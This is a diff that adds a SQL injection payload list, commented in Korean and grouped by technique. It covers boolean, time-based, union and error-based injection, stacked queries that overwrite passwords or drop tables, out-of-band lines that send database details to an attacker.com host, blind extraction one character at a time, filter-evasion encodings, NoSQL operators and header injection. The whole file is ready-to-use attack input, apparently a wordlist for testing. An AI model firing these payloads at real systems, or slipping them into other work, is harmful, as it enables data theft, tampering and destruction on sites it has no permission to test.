@@ -1,0 +1,181 @@
+# SQL Injection 페이로드
+# 각 취약점 유형별 대표 페이로드 및 다양한 공격 기법
+
+# ============================================
+# 1. Boolean-based Blind SQLi (참/거짓 기반)
+# ============================================
+# 참 또는 거짓의 쿼리문 삽입 시 반환되는 서버의 응답을 통해 데이터 추출
+1' OR '1'='1'--
+1' OR 1=1--
+1' AND 1=2--
+
+# ============================================
+# 2. Time-based Blind SQLi (시간 지연 기반)
+# ============================================
+# MySQL
+1' OR SLEEP(5)--
+1'; SELECT SLEEP(5)--
+
+# PostgreSQL
+1' OR pg_sleep(5)--
+1'; SELECT pg_sleep(5)--
+
+# MSSQL
+1'; WAITFOR DELAY '00:00:05'--
+1'; WAITFOR DELAY '0:0:5'--
+
+# Oracle
+1' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--
+
+# ============================================
+# 3. Union-based SQLi (UNION 쿼리 기반)
+# ============================================
+# 컬럼 수 탐지
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+
+# 데이터 추출
+1' UNION SELECT 1,2,3--
+1' UNION SELECT user(),database(),version()--
+1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+
+# ============================================
+# 4. Error-based SQLi (에러 메시지 기반)
+# ============================================
+# MySQL - EXTRACTVALUE
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--
+
+# MySQL - Double Query
+1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# PostgreSQL - CAST
+1' AND CAST((SELECT version()) AS int)--
+1' AND 1=CAST((SELECT user) AS int)--
+
+# MSSQL - CONVERT
+1' AND CONVERT(int, (SELECT @@version))--
+1' AND 1=CONVERT(int, (SELECT user_name()))--
+
+# Oracle - CTXSYS.DRITHSX.SN
+1' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
+
+# ============================================
+# 5. Stacked Queries (다중 쿼리)
+# ============================================
+# MySQL (일부 환경에서만 동작)
+1'; INSERT INTO users(username,password) VALUES('test','test')--
+1'; UPDATE users SET password='hacked' WHERE id=1--
+1'; DROP TABLE users--
+
+# MSSQL, PostgreSQL
+1'; INSERT INTO users(username,password) VALUES('test','test')--
+1'; UPDATE users SET password='hacked' WHERE id=1--
+1'; DROP TABLE users--
+
+# ============================================
+# 6. Second-order SQLi (2차 SQL Injection)
+# ============================================
+# 저장된 값이 나중에 쿼리에서 사용될 때 발생
+admin'--
+admin' OR '1'='1
+test' UNION SELECT * FROM users--
+
+# ============================================
+# 7. Out-of-band SQLi (대역 외)
+# ============================================
+# MySQL - DNS 조회
+1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test.txt')))--
+
+# MSSQL - DNS 조회
+1'; EXEC xp_dirtree '\\attacker.com\test'--
+
+# PostgreSQL - DNS 조회
+1'; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--
+
+# ============================================
+# 8. Boolean-based 데이터 추출 (SUBSTR, ASCII 활용)
+# ============================================
+# 웹사이트 참고: SUBSTR, ASCII, <, > 등 함수를 활용한 데이터 추출
+# 첫 번째 문자 추출
+1' AND ASCII(SUBSTR((SELECT user()),1,1))>64--
+1' AND ASCII(SUBSTR((SELECT database()),1,1))>64--
+1' AND ASCII(SUBSTR((SELECT version()),1,1))>64--
+
+# 테이블명 추출
+1' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>64--
+1' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables LIMIT 0,1)='u'--
+
+# 컬럼명 추출
+1' AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>64--
+
+# 데이터 추출
+1' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))>64--
+1' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 0,1)='a'--
+
+# ============================================
+# 9. Time-based 데이터 추출 (SUBSTR, ASCII 활용)
+# ============================================
+# MySQL - 첫 번째 문자 추출
+1' AND IF(ASCII(SUBSTR((SELECT user()),1,1))>64,SLEEP(5),0)--
+1' AND IF(ASCII(SUBSTR((SELECT database()),1,1))>64,SLEEP(5),0)--
+
+# PostgreSQL - 첫 번째 문자 추출
+1' AND (CASE WHEN ASCII(SUBSTR((SELECT user),1,1))>64 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+# MSSQL - 첫 번째 문자 추출
+1'; IF ASCII(SUBSTRING((SELECT user_name()),1,1))>64 WAITFOR DELAY '00:00:05'--
+
+# ============================================
+# 10. 필터 우회 기법
+# ============================================
+# 공백 우회
+1'/**/OR/**/1=1--
+1'/**/OR/**/'1'='1'--
+1'%09OR%091=1--
+1'%0AOR%0A1=1--
+
+# 주석 우회
+1' OR 1=1#
+1' OR 1=1-- 
+1' OR 1=1/*
+
+# 인코딩 우회
+%27 OR %271%27=%271%27--
+%27 OR %271%27=%271%27%23
+1%27%20OR%20%271%27=%271%27--
+
+# 대소문자 혼합
+1' Or '1'='1'--
+1' oR '1'='1'--
+1' OR '1'='1'--
+
+# 문자열 연결 (MySQL)
+1' OR '1'='1'||'1'='1'--
+1' OR CONCAT('1','=','1')--
+
+# ============================================
+# 11. NoSQL Injection (MongoDB 등)
+# ============================================
+# MongoDB
+{"$ne": null}
+{"$gt": ""}
+{"$where": "this.username == this.password"}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+
+# ============================================
+# 12. 헤더 기반 SQLi
+# ============================================
+# User-Agent
+' OR '1'='1'--
+' OR 1=1--
+
+# X-Forwarded-For
+' OR '1'='1'--
+' OR 1=1--
+
+# Cookie
+' OR '1'='1'--
+' OR 1=1--
